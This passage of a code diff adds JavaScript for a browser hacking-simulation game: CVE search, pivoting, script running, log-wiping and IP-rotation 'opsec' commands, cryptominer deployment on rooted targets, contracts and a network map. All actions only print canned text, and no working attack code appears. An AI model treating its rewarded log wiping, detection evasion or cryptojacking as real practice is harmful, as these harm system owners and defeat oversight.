+  if(!q){switchPane('cve');tPrint('dim','CVE-DB tab opened. Use: cve <search-term>');return;}
+  if(q==='discovered'){
+    tPrint('hdr','DISCOVERED CVEs (via nmap)');
+    if(!G.discoveredCves.length){tPrint('dim','None yet. Run nmap -sV -sC on targets.');return;}
+    G.discoveredCves.forEach(function(id){
+      var c=CVE_DISCOVERED.find(function(x){return x.id===id;})||CVE_DB.find(function(x){return x.id===id;});
+      if(c)tPrint('ok','  '+c.id+' -- '+c.name+' (CVSS '+c.score+')');
+    });
+    return;
+  }
+  var all=CVE_DB.concat(G.discoveredCves.map(function(id){return CVE_DISCOVERED.find(function(x){return x.id===id;});})).filter(Boolean);
+  var r=all.filter(function(c){return c.id.toLowerCase().includes(q)||c.name.toLowerCase().includes(q)||c.service.toLowerCase().includes(q)||c.sev.includes(q);});
+  if(!r.length){tPrint('dim','No CVEs matching "'+q+'". See CVE-DB tab.');return;}
+  r.forEach(function(c){tPrint('warn',c.id+' -- '+c.name);tPrint('dim','  '+c.service+' CVSS: '+c.score+' '+c.sev.toUpperCase());tPrint('dim','  '+c.desc.substring(0,100));tPrint('','');});
+}
+function cmdPivot(args,s,t){
+  if(!s.connected||!t){tPrint('err','Not connected.');return;}
+  if(!s.isRoot){tPrint('err','[!] Root/SYSTEM required for pivot.');return;}
+  if(G.tools.indexOf('metasploit-pro')<0){tPrint('err','[!] Metasploit Pro required. Buy in shop (2500c).');return;}
+  var dst=args[1]||args[0];
+  tPrint('sys','[*] Pivoting through '+t.domain+' to '+dst+'...');
+  after(1500,function(){tPrint('ok','[+] Pivot established: '+t.ip+' \u2192 '+dst);tPrint('dim','Internal network now accessible via '+t.ip);});
+}
+function cmdRun(args){
+  var name=args[0];if(!name){tPrint('err','Usage: run <script-name>  |  man run');return;}
+  // Strip .sh extension if provided
+  var bare=name.endsWith('.sh')?name.slice(0,-3):name;
+  // Check local editor scripts first
+  var sc=G.scripts&&G.scripts.find(function(s){return s.name===bare||s.name===name;});
+  if(sc){
+    tPrint('sys','[*] Executing: '+sc.name+'.sh');
+    sc.code.split('\n').filter(function(l){return l.trim()&&!l.trim().startsWith('#');}).slice(0,5).forEach(function(l){tPrint('dim','  > '+l);});
+    tPrint('ok','[+] Script complete.');
+    return;
+  }
+  // Check target filesystem if connected
+  var s=G.session,t=s.connected?COMPANIES.find(function(c){return c.id===s.targetId;}):null;
+  if(t){
+    var cwd=s.cwd;
+    var candidates=[
+      cwd+'/'+bare+'.sh', cwd+'/'+bare,
+      cwd+'/'+name+'.sh', cwd+'/'+name
+    ];
+    for(var i=0;i<candidates.length;i++){
+      var fp=candidates[i].replace(/\/+/g,'/');
+      var dir=fp.substring(0,fp.lastIndexOf('/')||1),base=fp.substring(fp.lastIndexOf('/')+1);
+      if((t.fs[dir]||[]).indexOf(base)>=0){
+        tPrint('sys','[*] Executing target script: '+fp);
+        if(t.fc&&t.fc[fp]){
+          t.fc[fp].split('\n').filter(function(l){return l.trim()&&!l.trim().startsWith('#');}).slice(0,6).forEach(function(l){tPrint('dim','  > '+l);});
+        } else {
+          tPrint('dim','  > [script runs on target -- output piped to terminal]');
+        }
+        tPrint('ok','[+] Script executed on '+t.domain);
+        return;
+      }
+    }
+  }
+  tPrint('err','run: '+name+': not found.');
+  tPrint('dim','  Local scripts: created via "editor" command');
+  tPrint('dim','  Target scripts: must be in current directory (check with ls)');
+  tPrint('dim','  Try: cd /opt/scripts  then  run monitor.sh');
+}
+
+
+// ====== OPSEC COMMANDS ======
+function cmdClearLogs(args,s,t){
+  if(G.tools.indexOf('log-cleaner')<0&&args[0]){tPrint('err','[!] Log Cleaner required for remote wipe. Buy in shop (800c).');return;}
+  var targetIp=args[0]||null;
+  if(targetIp){
+    var co=COMPANIES.find(function(c){return c.ip===targetIp||c.domain===targetIp;});
+    if(!co){tPrint('err','Unknown target: '+targetIp);return;}
+    if(G.tools.indexOf('log-cleaner')<0){tPrint('err','[!] Log Cleaner required. Buy in shop (800c).');return;}
+    tPrint('sys','[*] Wiping logs on '+co.domain+'...');
+    after(1200,function(){
+      tPrint('ok','[+] /var/log/auth.log cleared');tPrint('ok','[+] /var/log/syslog truncated');
+      tPrint('ok','[+] ~/.bash_history wiped');tPrint('ok','[+] Web access logs cleared');
+      var reduction=Math.min(G.wanted,2);G.wanted=Math.max(0,G.wanted-reduction);
+      renderWanted();tPrint('ok','[+] Wanted: -'+reduction.toFixed(1)+' (IDS signatures purged)');saveGame();
+    });
+  } else {
+    tPrint('sys','[*] Clearing local operation traces...');
+    after(600,function(){
+      G.wanted=Math.max(0,G.wanted-1);renderWanted();
+      tPrint('ok','[+] Local traces cleared. Wanted -1.');
+      tPrint('dim','    For remote wipe: clearlogs <ip>  (needs log-cleaner tool)');saveGame();
+    });
+  }
+}
+function cmdRotateIp(){
+  if(G.tools.indexOf('ip-rotator')<0){tPrint('err','[!] IP Rotator required. Buy in shop (1500c).');return;}
+  tPrint('sys','[*] Rotating attacker IP via proxy chain...');
+  after(1500,function(){
+    var old=G.wanted;G.wanted=Math.max(0,G.wanted-2);renderWanted();
+    tPrint('ok','[+] IP rotated. New exit node assigned.');
+    tPrint('ok','[+] Wanted: '+old.toFixed(1)+' \u2192 '+G.wanted.toFixed(1));
+    tPrint('dim','    Note: TOR provides continuous protection. IP Rotator is one-time.');saveGame();
+  });
+}
+function cmdDeployMiner(ip){
+  if(G.tools.indexOf('miner')<0){tPrint('err','[!] XMR Miner required. Buy in shop (500c).');return;}
+  if(!ip){tPrint('err','Usage: deploy miner <ip>  |  man miner');return;}
+  var co=COMPANIES.find(function(c){return c.ip===ip||c.domain===ip;});
+  if(!co||G.discovered.indexOf(co.id)<0){tPrint('err','Target not discovered.');return;}
+  var pw=G.pwned[co.id]||{};
+  if(!pw.hasRoot){tPrint('err','[!] Root access required to deploy miner. Run: privesc linpeas');return;}
+  if(!G.miners)G.miners={};
+  if(G.miners[co.id]){
+    tPrint('warn','[!] Miner already running on '+co.domain+'.');
+    tPrint('dim','    Current rate: \u20BF'+G.miners[co.id].rate+'/30s tick');return;
+  }
+  tPrint('sys','[*] Deploying XMR miner on '+co.domain+'...');
+  tPrint('sys','[*] Binding to CPU cores via cgroup manipulation...');
+  after(1500,function(){
+    var rates={easy:8,med:18,hard:35,elite:80};
+    var baseRate=rates[co.diff]||10;
+    if(G.tools.indexOf('miner-pool')>=0)baseRate=Math.floor(baseRate*2);
+    G.miners[co.id]={domain:co.domain,ip:co.ip,diff:co.diff,rate:baseRate,deployed:Date.now()};
+    tPrint('ok','[+] Miner deployed on '+co.domain);
+    tPrint('ok','[+] Mining rate: \u20BF'+baseRate+' per 30s tick');
+    tPrint('dim','    "miners" = view all rigs  |  Mining Pool in shop doubles rates');
+    if(co.sec.ids){riseWanted(0.5);tPrint('warn','[!] IDS may flag CPU spike -- monitor wanted level.');}
+    saveGame();renderNetmap();renderTopbar();
+  });
+}
+function cmdMiners(){
+  if(!G.miners||!Object.keys(G.miners).length){
+    tPrint('dim','No active miners.');tPrint('dim','Steps: root target -> buy miner (500c) -> deploy miner <ip>');return;
+  }
+  tPrint('hdr','ACTIVE MINERS');tPrint('pre','');
+  var total=0;
+  Object.entries(G.miners).forEach(function(kv){
+    var id=kv[0],m=kv[1];
+    var poolBonus=G.tools.indexOf('miner-pool')>=0?' [POOL x2]':'';
+    tPrint('ok','  \u26CF '+m.domain+' ('+m.ip+')');
+    tPrint('dim','    Tier: '+m.diff.toUpperCase()+'  Rate: \u20BF'+m.rate+'/30s'+poolBonus);
+    total+=m.rate;
+  });
+  tPrint('pre','');tPrint('sys','  TOTAL: \u20BF'+total+' per 30s tick  (\u20BF'+(total*2)+'/min)');
+  tPrint('dim','  Buy Mining Pool to double all rates. cat walkthrough-mining.txt');
+}
+
+
+// ====== PROGRESSION ======
+function checkContracts(target,path){
+  (target.contracts||[]).forEach(function(ct){
+    if(G.contracts[ct.id]!=='active')return;
+    var exfilled=G.pwned[target.id]?(G.pwned[target.id].exfilled||[]):[];
+    if(ct.target===path||exfilled.indexOf(ct.target)>=0||ct.target===path.split('/').pop()){
+      G.contracts[ct.id]='complete';
+      G.credits+=ct.reward.c;G.rep+=ct.reward.r;
+      tPrint('ok','');
+      var _w=40;
+      var _bar=Array(_w-1).join('\u2550');
+      var _title=ct.title,_reward='\u20BF'+ct.reward.c+' credits + '+ct.reward.r+' REP';
+      var _pad=function(s){var sp=Math.max(0,_w-2-s.length);var l=Math.floor(sp/2),r=sp-l;return '\u2551'+' '.repeat(l)+s+' '.repeat(r)+'\u2551';};
+      tPrint('ok','\u2554'+_bar+'\u2557');
+      tPrint('ok',_pad('CONTRACT COMPLETE'));
+      tPrint('ok',_pad(_title.substring(0,_w-4)));
+      tPrint('ok',_pad(_reward));
+      tPrint('ok','\u255A'+_bar+'\u255D');
+      renderTopbar();checkUnlock();saveGame();toast('\u2713 '+ct.title);
+    }
+  });
+}
+function checkUnlock(){
+  COMPANIES.forEach(function(co){
+    if(G.discovered.indexOf(co.id)>=0)return;
+    if(G.rep>=co.repReq){
+      G.discovered.push(co.id);
+      (co.contracts||[]).forEach(function(ct){if(G.contracts[ct.id]==='inactive')G.contracts[ct.id]='active';});
+      tPrint('ok','[NETWORK] New target unlocked: '+co.name+' ('+co.ip+')');
+      toast('\uD83D\uDD78 Unlocked: '+co.name);
+      renderNetmap();
+    }
+  });
+}
+
+
+// ====== WANTED ======
+function riseWanted(n){
+  if(!n)n=1;
+  if(G.tools.indexOf('tor')>=0)return;
+  var f=G.tools.indexOf('vpn-chain')>=0?0.4:1;
+  G.wanted=Math.min(5,G.wanted+(n*f));renderWanted();
+  if(G.wanted>=3){document.getElementById('ids-bar').classList.add('on');setTimeout(function(){document.getElementById('ids-bar').classList.remove('on');},5000);}
+}
+function triggerIDS(co){tPrint('warn','[IDS] '+co.name+': Intrusion signature matched!');riseWanted(1);}
+function renderWanted(){
+  if(!G)return;
+  for(var i=1;i<=5;i++){
+    var el=document.getElementById('ws'+i);if(!el)continue;
+    var on=i<=Math.floor(G.wanted);
+    el.classList.toggle('on',on);el.classList.remove('w3','w4','w5');
+    if(on&&i===3)el.classList.add('w3');
+    if(on&&i>=4)el.classList.add('w4');
+  }
+}
+
+
+// ====== TOPBAR + FS ======
+function renderTopbar(){
+  if(!G)return;
+  document.getElementById('tb-credits').textContent=G.credits;
+  document.getElementById('tb-rep').textContent=G.rep;
+  if(G.miners&&Object.keys(G.miners).length>0){
+    var total=Object.values(G.miners).reduce(function(a,m){return a+m.rate;},0);
+    document.getElementById('tb-miner-rate').textContent=total;
+    document.getElementById('tb-miner-stat').style.display='';
+  }
+}
+function renderFS(){
+  if(!G)return;
+  var s=G.session,t=s.connected?COMPANIES.find(function(c){return c.id===s.targetId;}):null;
+  document.getElementById('fs-path-disp').textContent=s.connected?s.cwd:'/home/'+G.handle;
+  document.getElementById('fs-ctx').textContent=t?t.domain:'local machine';
+  document.getElementById('fs-prev').style.display='none';
+  var el=document.getElementById('fs-body');
+  if(!s.connected){
+    var vfileList=Object.keys(VFILES).concat(['tools.txt','exploits.txt']);
+    var xfil=Object.values(G.pwned).reduce(function(a,p){return a+(p.exfilled||[]).length;},0);
+    el.innerHTML='<div class="fsi dir">\uD83D\uDCC1 ./</div>'
+      +vfileList.map(function(fn){return '<div class="fsi fil" data-lf="'+fn+'">\uD83D\uDCC4 '+fn+'</div>';}).join('')
+      +'<div class="fsi dir" data-lf="exfil">\uD83D\uDCC1 exfil/ ('+xfil+' files)</div>'
+      +'<div class="fsi dir">\uD83D\uDCC1 scripts/ ('+(G.scripts?G.scripts.length:0)+')</div>'
+      +(G.scripts||[]).map(function(sc){return '<div class="fsi exe" data-sc="'+sc.name+'">\u2699 '+sc.name+'.sh</div>';}).join('');
+    el.querySelectorAll('[data-lf]').forEach(function(d){
+      d.addEventListener('click',function(){
+        var lf=this.getAttribute('data-lf');
+        if(lf==='exfil'){
+          // Show exfilled files
+          tPrint('hdr','EXFIL STORE');
+          var any=false;
+          Object.entries(G.pwned).forEach(function(kv){
+            var id=kv[0],pw=kv[1];
+            if(pw.exfilled&&pw.exfilled.length){
+              var co=COMPANIES.find(function(c){return c.id===id;});
+              tPrint('sys','['+(co?co.domain:id)+']');
+              pw.exfilled.forEach(function(fp){tPrint('dim','  '+fp.split('/').pop()+' -- '+fp);any=true;});
+            }
+          });
+          if(!any)tPrint('dim','No files exfiltrated yet.');
+          switchPane('terminal');
+        } else {
+          termExec('cat '+lf);switchPane('terminal');
+        }
+      });
+    });
+    return;
+  }
+  var fs=t.fs,cwd=s.cwd,entries=fs[cwd]||[];
+  var html='';
+  if(cwd!=='/')html+='<div class="fsi dir" data-cd="..">\uD83D\uDCC1 ../</div>';
+  entries.forEach(function(e){
+    var fp=(cwd==='/'?'/':cwd+'/')+e;
+    var isDir=!!fs[fp];
+    var isKey=e.endsWith('id_rsa')||e.endsWith('.key')||e.endsWith('.pem');
+    var isLocked=(fp.startsWith('/root')||fp.includes('Administrator'))&&!s.isRoot;
+    var icon=isLocked?'\uD83D\uDD12':isKey?'\uD83D\uDD11':isDir?'\uD83D\uDCC1':e.match(/\.(sh|py)$/)?'\u2699':'\uD83D\uDCC4';
+    var cls=isLocked?'lck':isKey?'keyf':isDir?'dir':e.match(/\.(sh|py)$/)?'exe':'fil';
+    html+='<div class="fsi '+cls+'"'+(isDir&&!isLocked?' data-cd="'+fp+'"':'')+(!isDir&&!isLocked?' data-fp="'+fp+'"':'')+'>'+icon+' '+e+(isDir?'/':'')+'</div>';
+  });
+  el.innerHTML=html;
+  el.querySelectorAll('[data-cd]').forEach(function(d){d.addEventListener('click',function(){termExec('cd '+this.getAttribute('data-cd'));});});
+  el.querySelectorAll('[data-fp]').forEach(function(d){
+    d.addEventListener('click',function(){
+      var fp=this.getAttribute('data-fp');var content=(t.fc||{})[fp];var pr=document.getElementById('fs-prev');
+      if(content!==undefined){pr.style.display='block';pr.textContent=content.substring(0,500)+(content.length>500?'\n[...cat for full file]':'');}
+      termExec('cat '+fp);switchPane('terminal');
+    });
+  });
+}
+
+
+// ====== NETWORK MAP (SVG Force-Directed) ======
+var netNodes=[], netLinks=[], netSim=null, animFrame=null;
+var _netZoom=1.0, _netPanX=0, _netPanY=0, _netFocusId=null;
+var NET_ZOOM_MIN=0.4, NET_ZOOM_MAX=3.0, NET_ZOOM_STEP=0.25;
+
+function renderNetmap(){
+  if(!G)return;
+  var svg=document.getElementById('net-svg');
+  var meta=document.getElementById('net-meta');
+  var tooltip=document.getElementById('net-tooltip');
+  if(!svg)return;
+
+  var nodeCount=COMPANIES.length+1;
+  var netBody=document.getElementById('net-body');
+  var W=netBody?netBody.offsetWidth:window.innerWidth||600;
+  var H=netBody?netBody.offsetHeight:0;
+  // offsetHeight can be 0 if pane is hidden; fall back to window
+  if(H<100){H=Math.max(480,window.innerHeight-160);}
+  W=Math.max(300,Math.floor(W));
+  H=Math.max(400,Math.floor(H));
+  svg.setAttribute('width',W);
+  svg.setAttribute('height',H);
+  svg.setAttribute('viewBox','0 0 '+W+' '+H);
+  svg.style.display='block';
+  svg.style.width=W+'px';
+  svg.style.height=H+'px';
+  if(W<30){setTimeout(renderNetmap,300);return;}
+
+  document.getElementById('net-meta').textContent=G.discovered.length+' / '+COMPANIES.length+' targets';
+
+  // Build node list: attacker + discovered companies + locked placeholders
+  var nodes=[{id:'attacker',type:'attacker',label:G.handle,x:W/2,y:H/2,fixed:true}];
+  COMPANIES.forEach(function(co,i){
+    var disc=G.discovered.indexOf(co.id)>=0;
+    var pw=G.pwned[co.id]||{};
+    nodes.push({
+      id:co.id,type:'company',disc:disc,
+      hasShell:pw.hasShell,hasRoot:pw.hasRoot,
+      hasMiner:!!(G.miners&&G.miners[co.id]),
+      diff:co.diff,label:disc?co.name:'??? UNKNOWN',
+      sublabel:disc?co.ip:'REP '+co.repReq+' required',
+      x:W/2+Math.cos(i*Math.PI*2/COMPANIES.length)*(Math.min(W,H)*0.34),
+      y:H/2+Math.sin(i*Math.PI*2/COMPANIES.length)*(Math.min(W,H)*0.34)
+    });
+  });
+
+  // Links from attacker to discovered nodes
+  var links=[];
+  nodes.forEach(function(n){
+    if(n.id!=='attacker'&&n.disc)links.push({s:'attacker',t:n.id});
+    // peer links for rooted nodes (pivot potential)
+    if(n.hasRoot){nodes.forEach(function(m){if(m.id!==n.id&&m.id!=='attacker'&&m.disc&&m.hasShell){links.push({s:n.id,t:m.id});}});}
+  });
+
+  // Color scheme
+  var colors={
+    attacker:'#00ff41',
+    undiscovered:'#0a2a0a',
+    discovered:'#0f3f0f',
+    shell:'#ffdd00',
+    root:'#00ff88',
+    elite:'#ff2244',
+    hard:'#ff8800',
+    med:'#ffdd00',
+    easy:'#00ff41'
+  };
+
+  function nodeColor(n){
+    if(n.type==='attacker')return colors.attacker;
+    if(!n.disc)return colors.undiscovered;
+    if(n.hasRoot)return colors.root;
+    if(n.hasShell)return colors.shell;
+    return {easy:'#1a4a1a',med:'#2a3a1a',hard:'#3a2a0a',elite:'#3a0a0a'}[n.diff]||'#1a2a1a';
+  }
+  function nodeRadius(n){
+    if(n.type==='attacker')return 18;
+    if(!n.disc)return 10;
+    var base={easy:16,med:18,hard:20,elite:22}[n.diff]||16;
+    if(n.hasMiner)base+=4;
+    return base;
+  }
+  function strokeColor(n){
+    if(n.type==='attacker')return '#00ff41';
+    if(!n.disc)return '#0a2a0a';
+    if(n.hasRoot)return '#00ff88';
+    if(n.hasShell)return '#ffdd00';
+    return {easy:'#00ff41',med:'#ffdd00',hard:'#ff8800',elite:'#ff2244'}[n.diff]||'#0f3f0f';
+  }
+
+  // Simple force simulation (no D3 needed)
+  var ITER=220, REPEL=2800+nodeCount*200, SPRING=0.07, CENTER=0.015, DAMP=0.82;
+  var vx=nodes.map(function(){return 0;}), vy=nodes.map(function(){return 0;});
+
+  function simulate(){
+    for(var iter=0;iter<ITER;iter++){
+      // repulsion
+      for(var i=0;i<nodes.length;i++){
+        if(nodes[i].fixed)continue;
+        for(var j=0;j<nodes.length;j++){
+          if(i===j)continue;
+          var dx=nodes[i].x-nodes[j].x, dy=nodes[i].y-nodes[j].y;
+          var dist=Math.sqrt(dx*dx+dy*dy)+0.01;
+          var force=REPEL/(dist*dist);
+          vx[i]+=force*dx/dist; vy[i]+=force*dy/dist;
+        }
+      }
+      // spring for links
+      links.forEach(function(l){
+        var si=nodes.findIndex(function(n){return n.id===l.s;});
+        var ti=nodes.findIndex(function(n){return n.id===l.t;});
+        if(si<0||ti<0)return;
+        var dx=nodes[ti].x-nodes[si].x, dy=nodes[ti].y-nodes[si].y;
+        var dist=Math.sqrt(dx*dx+dy*dy)+0.01;
+        var targetLen=100+nodeCount*8;
+        var force=SPRING*(dist-targetLen);
+        var fx=force*dx/dist, fy=force*dy/dist;
+        if(!nodes[si].fixed){vx[si]+=fx;vy[si]+=fy;}
+        if(!nodes[ti].fixed){vx[ti]-=fx;vy[ti]-=fy;}
+      });
+      // center pull
+      for(var i=0;i<nodes.length;i++){
+        if(nodes[i].fixed)continue;
+        vx[i]+=(W/2-nodes[i].x)*CENTER;
+        vy[i]+=(H/2-nodes[i].y)*CENTER;
+        vx[i]*=DAMP; vy[i]*=DAMP;
+        nodes[i].x+=vx[i]; nodes[i].y+=vy[i];
+        // clamp
+        var r=nodeRadius(nodes[i]);
+        nodes[i].x=Math.max(r+4,Math.min(W-r-4,nodes[i].x));
+        nodes[i].y=Math.max(r+20,Math.min(H-r-4,nodes[i].y));
+      }
+    }
+  }
+  simulate();
+
+  // Build SVG
+  var svgParts=['<defs>'
+    +'<marker id="arr" markerWidth="6" markerHeight="4" refX="6" refY="2" orient="auto">'
+    +'<polygon points="0 0, 6 2, 0 4" fill="#0f3f0f"/>'
+    +'</marker>'
+    +'<filter id="glow"><feGaussianBlur stdDeviation="3" result="coloredBlur"/>'
+    +'<feMerge><feMergeNode in="coloredBlur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>'
+    +'</defs>'];
+
+  // Links
+  links.forEach(function(l){
+    var si=nodes.findIndex(function(n){return n.id===l.s;});
+    var ti=nodes.findIndex(function(n){return n.id===l.t;});
+    if(si<0||ti<0)return;
+    var src=nodes[si],dst=nodes[ti];
+    var isPivot=src.id!=='attacker'&&dst.id!=='attacker';
+    svgParts.push('<line x1="'+src.x.toFixed(1)+'" y1="'+src.y.toFixed(1)+'" x2="'+dst.x.toFixed(1)+'" y2="'+dst.y.toFixed(1)+'"'
+      +' stroke="'+(isPivot?'#3a3a00':'#0a3a0a')+'" stroke-width="'+(isPivot?'1':'1.5')+'"'
+      +' stroke-dasharray="'+(isPivot?'4,4':'none')+'" marker-end="url(#arr)" opacity="0.6"/>');
+  });
+
+  // Nodes
+  nodes.forEach(function(n){
+    var r=nodeRadius(n), fc=nodeColor(n), sc=strokeColor(n);
+    var glow=(n.hasRoot||n.type==='attacker')?'filter="url(#glow)"':'';
+    var group='<g data-id="'+n.id+'" class="'+(n.disc||n.type==='attacker'?'':'locked-node')+'" style="cursor:'+(n.disc||n.type==='attacker'?'pointer':'default')+'">';
+    // outer ring for miners
+    if(n.hasMiner){
+      svgParts.push(group+'<circle cx="'+n.x.toFixed(1)+'" cy="'+n.y.toFixed(1)+'" r="'+(r+5)+'" fill="none" stroke="#ffb000" stroke-width="1" stroke-dasharray="3,2" opacity="0.7"/>');
+    } else {
+      svgParts.push(group);
+    }
+    // main circle
+    svgParts.push('<circle cx="'+n.x.toFixed(1)+'" cy="'+n.y.toFixed(1)+'" r="'+r+'" fill="'+fc+'" stroke="'+sc+'" stroke-width="'+(n.type==='attacker'?2:1.5)+'" '+glow+'/>');
+    // label
+    var labelY=(n.y+r+12).toFixed(1);
+    var fsize=Math.max(7,Math.min(10,Math.floor(W/80)));svgParts.push('<text x="'+n.x.toFixed(1)+'" y="'+labelY+'" text-anchor="middle" font-family="Share Tech Mono,monospace" font-size="'+fsize+'" fill="'+(n.disc?sc:'#0a2a0a')+'">'+n.label.substring(0,18)+'</text>');
+    if(n.type!=='attacker'){
+      svgParts.push('<text x="'+n.x.toFixed(1)+'" y="'+(parseFloat(labelY)+fsize+2).toFixed(1)+'" text-anchor="middle" font-family="Share Tech Mono,monospace" font-size="'+(fsize-1)+'" fill="#2a5a2a">'+n.sublabel+'</text>');
+    }
+    // icons inside node
+    if(n.type==='attacker'){svgParts.push('<text x="'+n.x.toFixed(1)+'" y="'+(n.y+4).toFixed(1)+'" text-anchor="middle" font-size="12" fill="#000">&#x2328;</text>');}
+    else if(n.hasRoot){svgParts.push('<text x="'+n.x.toFixed(1)+'" y="'+(n.y+4).toFixed(1)+'" text-anchor="middle" font-size="10">&#x1F513;</text>');}
+    else if(n.hasShell){svgParts.push('<text x="'+n.x.toFixed(1)+'" y="'+(n.y+4).toFixed(1)+'" text-anchor="middle" font-size="10">&#x26A1;</text>');}
+    else if(!n.disc){svgParts.push('<text x="'+n.x.toFixed(1)+'" y="'+(n.y+4).toFixed(1)+'" text-anchor="middle" font-size="10">&#x1F512;</text>');}
+    svgParts.push('</g>');
+  });
+
+  // Legend (separate array — rendered outside zoom group so it stays fixed)
+  var legendParts=[];
+  legendParts.push('<g font-family="Share Tech Mono,monospace" font-size="8" fill="var(--textd)">');
+  var legend=[
+    {col:'#00ff88',label:'ROOTED'},
+    {col:'#ffdd00',label:'SHELL'},
+    {col:'#1a4a1a',label:'DISCOVERED'},
+    {col:'#0a2a0a',label:'LOCKED'},
+    {col:'#ffb000',label:'MINING',ring:true}
+  ];
+  legend.forEach(function(l,i){
+    var lx=10,ly=H-60+(i*13);
+    if(l.ring){legendParts.push('<circle cx="'+lx+'" cy="'+ly+'" r="5" fill="none" stroke="#ffb000" stroke-dasharray="2,1"/>');
+    } else {legendParts.push('<circle cx="'+lx+'" cy="'+ly+'" r="5" fill="'+l.col+'" stroke="'+l.col+'" stroke-width="1"/>');}
+    legendParts.push('<text x="'+(lx+10)+'" y="'+(ly+3)+'" fill="#2a5a2a">'+l.label+'</text>');
+  });
+  legendParts.push('</g>');
+
+  // Wrap nodes/links in zoom group; legend stays outside (fixed)
+  var legendParts=svgParts.splice(svgParts.indexOf(svgParts.find(function(s){return s.includes('font-family="Share Tech Mono')&&s.includes('fill="#2a5a2a"');})));
+  // Scale around canvas center so default view stays centered
+  var cx=W/2,cy=H/2;
+  var tx=cx+_netPanX-cx*_netZoom;
+  var ty=cy+_netPanY-cy*_netZoom;
+  var zoomGroup='<g id="net-zoom-group" transform="translate('+tx.toFixed(1)+','+ty.toFixed(1)+') scale('+_netZoom+')">'; 
+  svg.innerHTML=zoomGroup+svgParts.join('')+'</g>'+legendParts.join('');
+
+  // Tooltip on hover
+  svg.querySelectorAll('[data-id]').forEach(function(el){
+    el.addEventListener('mouseenter',function(e){
+      var id=this.getAttribute('data-id');
+      if(id==='attacker'){tooltip.innerHTML=G.handle+'<br>Attacker machine<br>Credits: \u20BF'+G.credits;tooltip.style.display='block';return;}
+      var co=COMPANIES.find(function(c){return c.id===id;});
+      if(!co)return;
+      var disc=G.discovered.indexOf(id)>=0,pw=G.pwned[id]||{};
+      tooltip.innerHTML=(disc?co.name:'UNKNOWN TARGET')+'<br>'+(disc?co.ip+' &middot; '+co.domain:'REP '+co.repReq+' required')+'<br>'+co.diff.toUpperCase()+(pw.hasRoot?' &middot; ROOTED':pw.hasShell?' &middot; SHELL':disc?' &middot; DISCOVERED':' &middot; LOCKED')+(G.miners&&G.miners[id]?' &middot; \u26CF MINING':'');
+      tooltip.style.display='block';
+    });
+    el.addEventListener('mouseleave',function(){tooltip.style.display='none';});
+  });
+}
+
+
+// ====== CVE DATABASE RENDER ======
+function renderCveDb(){
+  var q=(document.getElementById('cve-search').value||'').toLowerCase();
+  var discIds=G?G.discoveredCves:[];
+  var all=CVE_DB.slice();
+  // add discovered CVEs not already in base
+  discIds.forEach(function(id){
+    if(!CVE_DB.find(function(c){return c.id===id;})){
+      var dc=CVE_DISCOVERED.find(function(c){return c.id===id;});
+      if(dc)all.push(dc);
+    }
+  });
+  var r=q?all.filter(function(c){
+    return c.id.toLowerCase().includes(q)||c.name.toLowerCase().includes(q)||
+           (c.service||'').toLowerCase().includes(q)||c.sev.includes(q);
+  }):all;
+  var isNew=function(id){return discIds.indexOf(id)>=0&&!CVE_DB.find(function(c){return c.id===id;});};
+  document.getElementById('cve-count').textContent=all.length+' entries ('+discIds.length+' discovered)';
+  document.getElementById('cve-body').innerHTML=r.map(function(c){
+    var newBadge=isNew(c.id)?'<span class="cve-new-badge">NEW</span>':'';
+    return '<div class="cve-card">'
+      +'<div class="cve-id">'+c.id+newBadge+'</div>'
+      +'<div class="cve-name">'+c.name+'</div>'
+      +'<span class="cve-score '+c.sev+'">CVSS '+c.score+' \u2014 '+c.sev.toUpperCase()+'</span>'
+      +'<div class="cve-desc">'+c.desc.substring(0,160)+'...</div>'
+      +'<div class="cve-detail">'
+      +'<div style="margin-bottom:4px"><b style="color:var(--g)">Service:</b> '+c.service+' &nbsp; Port: '+c.port+'</div>'
+      +'<div style="margin-bottom:4px"><b style="color:var(--g)">Phase:</b> '+c.phase+'</div>'
+      +'<div style="margin-bottom:4px"><b style="color:var(--g)">Exploit:</b><pre style="color:var(--cyan);font-size:10px;margin-top:3px;white-space:pre-wrap">'+c.exploit+'</pre></div>'
+      +'<div><b style="color:var(--g)">Remediation:</b> '+c.fix+'</div>'
+      +'</div></div>';
+  }).join('');
+}
+
+
+// ====== BROWSER ======
+var curSite=null,curPage=null;
+
+function buildSiteContent(coId,page){
+  var co=COMPANIES.find(function(c){return c.id===coId;});if(!co)return '<p style="color:var(--red)">Site not found.</p>';
+  var pw=G?(G.pwned[coId]||{}):{},sess=G?G.session:{};
+  var loggedIn=pw.hasShell&&sess.targetId===coId;
+  var auth=loggedIn?'<div class="salert ok">&#x2713; Authenticated as '+(sess.user||'user')+(pw.hasRoot?' [ROOT]':'')+'</div>':'';
+  var vulnBadge=function(v){return '<span class="vi vi-'+v+'">'+v.toUpperCase()+'</span>';};
+  var nav=(co.webPages||['home','portal']).map(function(p){
+    return '<div class="snav'+(p===page?' on':'')+'" data-pg="'+p+'">'+p.toUpperCase()+'</div>';
+  }).join('');
+  // Generic page generator based on company data
+  var content='<div class="ssec"><p style="color:var(--textd)">[Page: '+page+']</p></div>';
+  if(page==='home'){
+    content='<div class="ssec"><h3>'+co.name+'</h3><p>'+co.desc+'</p></div>'
+      +'<div class="ssec"><h3>Infrastructure</h3><ul>'
+      +co.ports.map(function(p){return '<li>'+p.svc+' '+p.num+' &mdash; '+p.ver+'</li>';}).join('')
+      +'</ul></div>';
+  } else if(page==='portal'){
+    var loginId=coId+'-u',passId=coId+'-p',lrId=coId+'-lr',btnId=coId+'-login';
+    content=loggedIn
+      ?auth+'<div class="ssec"><h3>Dashboard</h3><ul>'
+        +(pw.hasRoot?'<li><span class="slink" data-term="cat /root/flag.txt">View flag.txt</span></li>':'')
+        +'<li><span class="slink" data-term="ls /var/www/html">List web files</span></li>'
+        +'</ul></div>'
+      :'<div class="ssec"><h3>Staff Login '+vulnBadge('sqli')+(co.sec.csrf?vulnBadge('csrf'):'')+' </h3>'
+        +'<div class="sform"><label>Username</label><input id="'+loginId+'" autocomplete="off" autocorrect="off" autocapitalize="off">'
+        +'<label>Password</label><input id="'+passId+'" type="password">'
+        +(co.sec.mfa?'<label>MFA Token</label><input id="'+coId+'-m" placeholder="000000">':'')
+        +'<p class="meta" style="margin-top:4px">'+(!co.sec.mfa?'No CSRF token. ':'')+(!co.sec.waf?'No WAF. ':'')+(!co.sec.ids?'No IDS. ':'')+'</p>'
+        +'<button class="fbtn" id="'+btnId+'">LOGIN</button><div id="'+lrId+'"></div></div></div>';
+  } else if(page==='api'){
